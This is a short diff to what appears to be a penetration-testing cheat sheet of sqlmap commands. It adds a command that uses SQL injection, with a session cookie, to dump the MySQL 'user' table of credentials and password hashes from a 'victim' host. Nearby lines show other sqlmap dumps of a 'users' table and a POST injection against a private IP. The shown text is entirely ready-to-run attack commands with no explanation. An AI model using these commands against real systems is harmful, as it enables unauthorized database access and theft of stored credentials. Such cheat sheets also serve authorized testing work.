@@ -727,6 +727,10 @@ sqlmap -u "https://victim/view.asp?bid=1&b_idx=45&s_type=&s_keyword=&page=1" --d
 # Table dump
 sqlmap -u "https://victim/view.asp?bid=1&b_idx=45&s_type=&s_keyword=&page=1" --dbms=mssql --technique=E -D WEBDB -T users --threads=10 --dump --batch
 
+
+# Dump MySQL User Table
+sqlmap -u http://victim/Market2.php?item=51 -p item --cookie="PHPSESSID=9na7i94onipotmi0gk17c2v3f4" -D mysql -T user --dump --batch
+
 # POST request
 sqlmap -u "http://192.168.225.48/" --data="mail-list=asdf@asdf.com" --method=POST --dbs --batch
 
